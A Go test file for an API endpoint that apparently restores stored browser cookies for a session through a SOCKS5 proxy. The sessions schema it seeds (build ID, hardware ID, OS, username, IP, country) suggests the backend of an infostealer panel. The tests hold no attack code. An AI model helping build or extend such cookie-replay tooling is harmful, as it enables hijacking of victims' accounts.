package api_test

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/google/uuid"
)

func TestRestore_NoSession(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	body := `{"session_id":"` + uuid.New().String() + `","proxy":"socks5://127.0.0.1:1080"}`
	req := httptest.NewRequest(http.MethodPost, "/api/restore/cookies", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusNotFound {
		t.Fatalf("expected 404, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp["error"] == "" {
		t.Error("expected error message")
	}
}

func TestRestore_NoProxy(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`, sid)
	if err != nil {
		t.Fatal(err)
	}

	body := `{"session_id":"` + sid + `"}`
	req := httptest.NewRequest(http.MethodPost, "/api/restore/cookies", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp["error"] == "" {
		t.Error("expected error message")
	}
}
